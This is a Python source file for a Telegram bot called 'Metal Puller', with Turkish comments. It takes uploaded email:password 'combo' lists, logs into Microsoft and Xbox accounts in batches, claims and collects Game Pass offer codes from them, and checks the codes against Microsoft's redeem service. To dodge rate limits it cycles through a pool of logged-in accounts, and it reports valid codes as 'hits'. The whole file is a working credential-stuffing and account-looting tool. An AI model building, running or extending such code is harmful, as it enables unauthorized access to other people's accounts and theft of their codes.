#!/usr/bin/env python3
"""
🤖 METAL PULLER - TELEGRAM BOT EDITION 🤖
Railway & Turbo CPM Approved.
"""

import asyncio
import logging
import random
import string
import os
import re
import uuid
import hashlib
import platform
import time
from datetime import datetime
from typing import Optional, Tuple, List, Dict
from urllib.parse import urlparse, parse_qs
import requests

# Telegram Bot Imports
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================================================
# GLOBAL STATE & CONFIGURATION
# ============================================================================
# Railway ortam değişkenlerinden veya direkt buraya yazarak alabilirsin
BOT_TOKEN = os.getenv("BOT_TOKEN", "BURAYA_BOT_TOKEN_YAZIN")
LICENSE_URL = "https://raw.githubusercontent.com/plutobearz/liscenses/refs/heads/main/licenses.json"

# Botun çalışma durumunu ve istatistiklerini RAM üzerinde tutuyoruz (Railway için en temizi)
class BotState:
    def __init__(self):
        self.accounts = []       # [(email, pwd), ...]
        self.custom_codes = []   # Kullanıcının validation için attığı kodlar
        self.fetched_codes = []  # Hesaplardan çekilen kodlar
        self.is_running = False
        self.current_task = None # 'pull_and_validate', 'validate_only', 'pull_only'
        
        # Canlı İstatistikler (Live Results)
        self.stats = {
            "total_accounts": 0,
            "processed_accounts": 0,
            "total_codes": 0,
            "processed_codes": 0,
            "valid": 0,
            "card_required": 0,
            "region_locked": 0,
            "invalid": 0,
            "unknown": 0,
            "rate_limited_accs": 0
        }
        self.rate_limited_emails = set()
        self.processed_code_set = set()

STATE = BotState()

# ============================================================================
# XBOX & MICROSOFT LOGIC (ASYNCHRONOUS WRAPPERS FOR HIGH CPM)
# ============================================================================

MICROSOFT_OAUTH_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

def generate_reference_id():
    timestamp_val = int(time.time() // 30)
    n = f'{timestamp_val:08X}'
    o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
    result_chars = []
    for e in range(64):
        if e % 8 == 1:
            result_chars.append(n[(e - 1) // 8])
        else:
            result_chars.append(o[e])
    return "".join(result_chars)

# Tüm HTTP isteklerini asenkron thread'lerde çalıştırarak Telegram event loop'unu bloklamıyoruz (Yüksek CPM Sırrı)
async def run_in_executor(func, *args):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, func, *args)

def fetch_oauth_tokens(session):
    try:
        response = session.get(MICROSOFT_OAUTH_URL, timeout=10)
        text = response.text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if not match: return (None, None)
        ppft = match.group(1)
        match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
        if not match: return (None, None)
        return (match.group(1), ppft)
    except: return (None, None)

def fetch_login(session, email, password, url_post, ppft):
    try:
        resp = session.post(url_post, data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft},
                           headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
        if '#' in resp.url:
            token = parse_qs(urlparse(resp.url).fragment).get('access_token', ['None'])[0]
            if token != 'None': return token
        return None
    except: return None

def get_xbox_tokens(session, rps_token):
    try:
        resp = session.post('https://user.auth.xboxlive.com/user/authenticate',
            json={'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT',
                  'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token}},
            headers={'Content-Type': 'application/json'}, timeout=15)
        if resp.status_code != 200: return (None, None)
        user_token = resp.json().get('Token')
        
        resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
            json={'RelyingParty': 'http://xboxlive.com', 'TokenType': 'JWT',
                  'Properties': {'UserTokens': [user_token], 'SandboxId': 'RETAIL'}},
            headers={'Content-Type': 'application/json'}, timeout=15)
        if resp.status_code != 200: return (None, None)
        data = resp.json()
        return (data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs'), data.get('Token'))
    except: return (None, None)

def fetch_codes_from_xbox(session, uhs, xsts_token):
    try:
        auth = f'XBL3.0 x={uhs};{xsts_token}'
        resp = session.get('https://profile.gamepass.com/v2/offers',
            headers={'Authorization': auth, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}, timeout=15)
        if resp.status_code != 200: return []
        
        codes = []
        for offer in resp.json().get('offers', []):
            resource = offer.get('resource')
            if resource:
                codes.append(resource)
            elif offer.get('offerStatus') == 'available':
                cv = ''.join(random.choices(string.ascii_letters + string.digits, k=22)) + '.0'
                claim_resp = session.post(f'https://profile.gamepass.com/v2/offers/{offer.get("offerId")}',
                    headers={'Authorization': auth, 'content-type': 'application/json', 'User-Agent': 'okhttp/4.12.0', 'ms-cv': cv, 'Content-Length': '0'},
                    data='', timeout=15)
                if claim_resp.status_code == 200:
                    code = claim_resp.json().get('resource')
                    if code: codes.append(code)
        return codes
    except: return []

def login_microsoft_account(email, password):
    session = requests.Session()
    session.headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    try:    
        login_response = session.post(
            f"https://login.live.com/ppsecure/post.srf?username={email}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=1761964181&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none",
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$"},
            allow_redirects=True, timeout=20
        )
        reurl_match = re.search(r'replace\(\"([^\"]+)\"', login_response.text.replace('\\', ''))
        if not reurl_match: return None
        reresp = session.get(reurl_match.group(1), timeout=20).text
        actch = re.search(r'<form.*?action="(.*?)".*?>', reresp)
        if not actch: return None
        input_matches = re.findall(r'<input.*?name="(.*?)".*?value="(.*?)".*?>', reresp)
        final_response = session.post(actch.group(1), data={n: v for n, v in input_matches}, allow_redirects=True, timeout=20)
        if final_response.status_code == 200: return session
    except: return None

def get_auth_token(session):
    try:
        if hasattr(session, 'wlid_token'): return session.wlid_token
        session.get("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", timeout=10)
        token_response = session.get('https://account.microsoft.com/auth/acquire-onbehalf-of-token', params={'scopes': 'MSComServiceMBISSL'}, timeout=15)
        token = token_response.json()[0]['token']
        session.wlid_token = token
        return token
    except: return None

def get_store_cart_state(session):
    try:
        if hasattr(session, 'store_state'): return session.store_state
        token = get_auth_token(session)
        if not token: return None
        ms_cv = "xddT7qMNbECeJpTq.6.2"
        response = session.post('https://www.microsoft.com/store/purchase/buynowui/redeemnow', 
                                params={'ms-cv': ms_cv, 'market': 'US', 'locale': 'en-GB', 'clientName': 'AccountMicrosoftCom'},
                                data={'data': '{"usePurchaseSdk":true}', 'market': 'US', 'cV': ms_cv, 'locale': 'en-GB', 'msaTicket': token, 'pageFormat': 'full', 'urlRef': 'https://account.microsoft.com/billing/redeem', 'isRedeem': 'true', 'clientType': 'AccountMicrosoftCom', 'layout': 'Inline', 'scenario': 'redeem'}, timeout=20)
        match = re.search(r'window\.__STORE_CART_STATE__=({.*?});', response.text, re.DOTALL)
        store_state = json.loads(match.group(1))
        extracted = {
            'ms_cv': store_state['appContext']['cv'], 'tracking_id': store_state['appContext']['trackingId'],
            'vector_id': store_state['appContext']['vectorId'], 'correlation_id': store_state['appContext']['correlationId'],
            'alternative_muid': store_state['appContext']['alternativeMuid']
        }
        session.store_state = extracted
        return extracted
    except: return None

def validate_code_primary(session, code):
    if not code or len(code) < 5 or any(char in ['A', 'E', 'I', 'O', 'U', 'L', 'S', '0', '1', '5'] for char in code):
        return {"status": "INVALID", "message": "Format Error"}
    store_state = get_store_cart_state(session)
    token = get_auth_token(session)
    if not store_state or not token: return {"status": "ERROR", "message": "Session Error"}
    
    try:
        headers = {
            "x-ms-tracking-id": store_state['tracking_id'], "authorization": f"WLID1.0=t={token}",
            "x-ms-client-type": "AccountMicrosoftCom", "x-ms-market": "US", "ms-cv": store_state['ms_cv'],
            "x-ms-reference-id": generate_reference_id(), "x-ms-vector-id": store_state['vector_id'],
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "x-ms-correlation-id": store_state['correlation_id'], "content-type": "application/json",
            "x-authorization-muid": store_state['alternative_muid'], "accept": "*/*"
        }
        payload = {"market": "US", "language": "en-US", "flights": [], "tokenIdentifierValue": code, "supportsCsvTypeTokenOnly": False, "buyNowScenario": "redeem", "clientContext": {"client": "AccountMicrosoftCom", "deviceFamily": "Web"}}
        
        response = requests.post('https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken', headers=headers, json=payload, timeout=20)
        if response.status_code == 429: return {"status": "RATE_LIMITED"}
        data = response.json()
        
        if "tokenType" in data and data["tokenType"] == "CSV": return {"status": "BALANCE_CODE", "title": f"{data.get('value')} {data.get('currency')}"}
        if "errorCode" in data and data["errorCode"] == "TooManyRequests": return {"status": "RATE_LIMITED"}
        
        if "events" in data and data["events"]["cart"]:
            reason = data["events"]["cart"][0].get("data", {}).get("reason", "")
            if "TooManyRequests" in reason: return {"status": "RATE_LIMITED"}
            if reason == "RedeemTokenAlreadyRedeemed": return {"status": "REDEEMED"}
            if reason in ["RedeemTokenExpired", "RedeemTokenNoMatchingOrEligibleProductsFound"]: return {"status": "EXPIRED"}
            if reason == "RedeemTokenGeoFencingError": return {"status": "REGION_LOCKED"}
            if reason in ["RedeemTokenNotFound", "InvalidProductKey"]: return {"status": "INVALID"}
            
        if "products" in data and len(data["products"]) > 0:
            p_title = data["products"][0].get("sku", {}).get("title", "Unknown Game")
            is_card = data.get("productInfos", [{}])[0].get("isPIRequired", False)
            return {"status": "VALID_REQUIRES_CARD" if is_card else "VALID", "title": p_title}
            
        return {"status": "UNKNOWN"}
    except: return {"status": "ERROR"}

# ============================================================================
# LIVE RESULTS & UPDATER BACKGROUND TASK
# ============================================================================
async def live_results_updater(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int):
    """Her 5 saniyede bir Telegram mesajını yeni istatistiklerle günceller."""
    while STATE.is_running:
        await asyncio.sleep(5)
        
        # Railway Hayvan gibi CPM Durum Ekranı
        text = (
            f"⚡ *METAL PULLER LIVE RESULTS* ⚡\n"
            f"=============================\n"
            f"🎯 *Task:* `{STATE.current_task.upper()}`\n"
            f"👥 *Accounts:* `{STATE.stats['processed_accounts']}/{STATE.stats['total_accounts']}`\n"
            f"🔑 *Codes Processed:* `{STATE.stats['processed_codes']}/{STATE.stats['total_codes']}`\n"
            f"=============================\n"
            f"✅ *Valid:* `{STATE.stats['valid']}`\n"
            f"💳 *Card Req:* `{STATE.stats['card_required']}`\n"
            f"🌍 *Region Locked:* `{STATE.stats['region_locked']}`\n"
            f"❌ *Invalid:* `{STATE.stats['invalid']}`\n"
            f"⚠️ *Unknown/Expired:* `{STATE.stats['unknown']}`\n"
            f"⏳ *Rate Limited Accs:* `{STATE.stats['rate_limited_accs']}`\n"
            f"=============================\n"
            f"🕒 *Last Update:* `{datetime.now().strftime('%H:%M:%S')}`\n"
            f"🚀 _Running on Railway Turbo Mode..._"
        )
        
        try:
            await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode="Markdown")
        except Exception:
            pass # Mesaj değişmediyse hata vermesini geç

# ============================================================================
# CORE WORKERS (PULL & VALIDATE ENGINE)
# ============================================================================
async def start_pull_and_validate(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int):
    STATE.is_running = True
    STATE.stats = {k: 0 for k in STATE.stats}
    STATE.stats["total_accounts"] = len(STATE.accounts)
    STATE.rate_limited_emails.clear()
    STATE.processed_code_set.clear()
    STATE.fetched_codes.clear()
    
    # Canlı güncelleyiciyi başlat (5sn'de bir)
    asyncio.create_task(live_results_updater(context, chat_id, message_id))
    
    # PHASE 1: PULL CODES (Hesaplardan Kodları Topla)
    pulled_codes = []
    
    async def pull_worker(email, pwd):
        if not STATE.is_running: return
        sess = requests.Session()
        sess.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
        try:
            url_p, ppft = await run_in_executor(fetch_oauth_tokens, sess)
            if url_p:
                rps = await run_in_executor(fetch_login, sess, email, pwd, url_p, ppft)
                if rps:
                    uhs, xsts = await run_in_executor(get_xbox_tokens, sess, rps)
                    if uhs:
                        codes = await run_in_executor(fetch_codes_from_xbox, sess, uhs, xsts)
                        pulled_codes.extend(codes)
        except: pass
        finally:
            STATE.stats["processed_accounts"] += 1
            sess.close()

    # Railway üzerinde sınırları zorlamak için aynı anda 15 hesap taratıyoruz (Konfigüre edilebilir)
    chunks = [STATE.accounts[i:i + 15] for i in range(0, len(STATE.accounts), 15)]
    for chunk in chunks:
        if not STATE.is_running: break
        tasks = [pull_worker(email, pwd) for email, pwd in chunk]
        await asyncio.gather(*tasks)

    STATE.stats["total_codes"] = len(pulled_codes)
    STATE.fetched_codes = pulled_codes
    
    if STATE.current_task == 'pull_only' or not pulled_codes:
        STATE.is_running = False
        # Dosya olarak çıktı ver
        if pulled_codes:
            with open("pulled_codes.txt", "w") as f: f.write("\n".join(pulled_codes))
            await context.bot.send_document(chat_id=chat_id, document=open("pulled_codes.txt", "rb"), caption="✅ Pull işlemi bitti. Kodlar dosyada.")
        return

    # PHASE 2: VALIDATE CODES (Kuyruktaki Kodları Hesapları Dönerek Kontrol Et)
    await run_validation_loop(context, chat_id, pulled_codes)

async def run_validation_loop(context: ContextTypes.DEFAULT_TYPE, chat_id: int, codes_list: list):
    # Geçerli microsoft oturumu açabilen tüm hesap havuzunu hazırla
    active_sessions = []
    
    async def login_worker(email, pwd):
        sess = await run_in_executor(login_microsoft_account, email, pwd)
        if sess: active_sessions.append((email, sess))
        
    login_tasks = [login_worker(em, pw) for em, pw in STATE.accounts[:20]] # İlk 20 hesabı validator havuzu yap
    await asyncio.gather(*login_tasks)
    
    if not active_sessions:
        STATE.is_running = False
        await context.bot.send_message(chat_id=chat_id, text="❌ Kodları check etmek için hiçbir Microsoft hesabı login olamadı!")
        return

    # Kod kontrol döngüsü
    code_index = 0
    while STATE.is_running and code_index < len(codes_list):
        for email, session in active_sessions:
            if code_index >= len(codes_list) or not STATE.is_running: break
            if email in STATE.rate_limited_emails: continue
            
            code = codes_list[code_index]
            if code in STATE.processed_code_set:
                code_index += 1
                continue
                
            res = await run_in_executor(validate_code_primary, session, code)
            status = res.get("status", "ERROR")
            
            if status == "RATE_LIMITED":
                STATE.rate_limited_emails.add(email)
                STATE.stats["rate_limited_accs"] += 1
                continue # Bu hesabı atla, sonraki kod için sonraki hesaba geç
                
            elif status == "ERROR":
                continue
                
            # İstatistikleri Güncelle
            STATE.processed_code_set.add(code)
            STATE.stats["processed_codes"] += 1
            code_index += 1
            
            if status in ["VALID", "BALANCE_CODE"]:
                STATE.stats["valid"] += 1
                title = res.get("title", "Gamepass")
                await context.bot.send_message(chat_id=chat_id, text=f"✅ *HIT FOUND!*\n`{code}` | {title}", parse_mode="Markdown")
            elif status == "VALID_REQUIRES_CARD":
                STATE.stats["card_required"] += 1
                title = res.get("title", "Gamepass")
                await context.bot.send_message(chat_id=chat_id, text=f"💳 *CARD REQUIRED HIT!*\n`{code}` | {title}", parse_mode="Markdown")
            elif status == "REGION_LOCKED": STATE.stats["region_locked"] += 1
            elif status == "INVALID": STATE.stats["invalid"] += 1
            else: STATE.stats["unknown"] += 1
            
            await asyncio.sleep(0.1) # Küçücük bir nefes (Railway CPM için optimize)

    STATE.is_running = False
    await context.bot.send_message(chat_id=chat_id, text="🏁 *METAL PULLER İŞLEMI TAMAMLANDI!* Tüm sonuçlar yukarıdaki live panelde sabitlendi.")

# ============================================================================
# TELEGRAM BOT HANDLERS & INTERFACE
# ============================================================================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ana Menü Butonları"""
    keyboard = [
        [InlineKeyboardButton("⚡ PULL AND VALIDATE", callback_data="pull_and_validate")],
        [InlineKeyboardButton("🔍 VALIDATE ONLY", callback_data="validate_only")],
        [InlineKeyboardButton("📥 PULL ONLY", callback_data="pull_only")],
        [InlineKeyboardButton("🛑 STOP", callback_data="stop_engine"), InlineKeyboardButton("📊 CLEAR", callback_data="clear_data")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        f"🤖 *WELCOME TO METAL PULLER BOT* 🤖\n"
        f"=============================\n"
        f"📂 *Loaded Accounts:* `{len(STATE.accounts)}` packs\n"
        f"🔑 *Loaded Custom Codes:* `{len(STATE.custom_codes)}` pcs\n"
        f"=============================\n"
        f"👇 Lütfen yapmak istediğiniz işlemi aşağıdaki butonlardan seçin. "
        f"Hesap eklemek için `.txt` dosyasını bota göndermeniz yeterlidir."
    )
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_docs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kullanıcıdan gelen Combo veya Kod Dosyalarını yakalar"""
    doc = update.message.document
    file = await context.bot.get_file(doc.file_id)
    content = await file.download_as_bytearray()
    text_data = content.decode('utf-8', errors='ignore')
    
    lines = [l.strip() for l in text_data.split('\n') if l.strip()]
    
    # İçerik tespiti (Combo mu yoksa düz kod listesi mi?)
    if ":" in lines[0] and "@" in lines[0]:
        STATE.accounts = []
        for line in lines:
            if ":" in line:
                parts = line.split(":", 1)
                STATE.accounts.append((parts[0].strip(), parts[1].strip()))
        await update.message.reply_text(f"✅ `{len(STATE.accounts)}` adet *Account (Combo)* başarıyla yüklendi!", parse_mode="Markdown")
    else:
        STATE.custom_codes = [l.split('|')[0].strip() for l in lines]
        await update.message.reply_text(f"✅ `{len(STATE.custom_codes)}` adet *Custom Code* listesi başarıyla yüklendi!", parse_mode="Markdown")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "stop_engine":
        STATE.is_running = False
        await query.edit_message_text("🛑 İşlem kullanıcı tarafından durduruldu.")
        return
        
    if query.data == "clear_data":
        STATE.__init__()
        await query.edit_message_text("🗑️ Tüm hafıza ve istatistikler temizlendi. Yeniden komut verin: /start")
        return

    if STATE.is_running:
        await query.message.reply_text("⚠️ Şu an çalışan aktif bir işlem var! Lütfen bitmesini bekleyin ya da STOP butonuna basın.")
        return

    # Canlı Sonuç Paneli Mesajı İlk Atılış
    live_msg = await query.message.reply_text("🔄 Engine başlatılıyor... Canlı sonuçlar hazırlanıyor...", parse_mode="Markdown")
    
    if query.data == "pull_and_validate":
        if not STATE.accounts:
            await live_msg.edit_text("❌ Önce bota combo listesi (.txt dosyası) göndermelisin!")
            return
        STATE.current_task = 'pull_and_validate'
        asyncio.create_task(start_pull_and_validate(context, query.message.chat_id, live_msg.message_id))
        
    elif query.data == "pull_only":
        if not STATE.accounts:
            await live_msg.edit_text("❌ Önce bota combo listesi (.txt dosyası) göndermelisin!")
            return
        STATE.current_task = 'pull_only'
        asyncio.create_task(start_pull_and_validate(context, query.message.chat_id, live_msg.message_id))
        
    elif query.data == "validate_only":
        if not STATE.accounts or not STATE.custom_codes:
            await live_msg.edit_text("❌ Bu işlem için hem Combo listesi hem de kontrol edilecek Kod listesi yüklemiş olmalısın!")
            return
        STATE.current_task = 'validate_only'
        STATE.is_running = True
        STATE.stats = {k: 0 for k in STATE.stats}
        STATE.stats["total_accounts"] = len(STATE.accounts)
        STATE.stats["total_codes"] = len(STATE.custom_codes)
        
        asyncio.create_task(live_results_updater(context, query.message.chat_id, live_msg.message_id))
        asyncio.create_task(run_validation_loop(context, query.message.chat_id, STATE.custom_codes))

# ============================================================================
# MAIN APPLICATION
# ============================================================================
import json

def main():
    if BOT_TOKEN == "BURAYA_BOT_TOKEN_YAZIN":
        print("❌ LÜTFEN KODUN EN ÜSTÜNDEKİ VEYA ENVIRONMENTDEKİ 'BOT_TOKEN' ALANINI DOLDURUN!")
        return

    app = Application.builder().token(BOT_TOKEN).build()
    
    # Handlers
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_docs))
    
    print("🤖 METAL PULLER TELEGRAM BOT ONLINE! Railway üzerinde yardırmaya hazır.")
    app.run_polling()

if __name__ == '__main__':
    main()

